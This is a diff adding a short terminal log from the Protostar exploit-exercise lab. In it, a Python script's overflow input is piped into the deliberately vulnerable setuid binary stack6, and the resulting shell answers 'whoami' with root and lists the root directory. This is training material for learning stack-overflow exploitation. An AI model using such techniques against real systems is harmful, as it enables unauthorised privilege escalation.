@@ -1,0 +1,6 @@
+user@protostar:/tmp$ (python stack6_1.py; cat) | /opt/protostar/bin/stack6
+input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP???RRRRSSSSTTTT???AAAA?c??
+whoami
+root
+ls /
+bin  boot  dev	etc  home  initrd.img  lib  live  lost+found  media  mnt  opt  proc  sbin  selinux  srv  sys  tmp  usr	var  vmlinuz
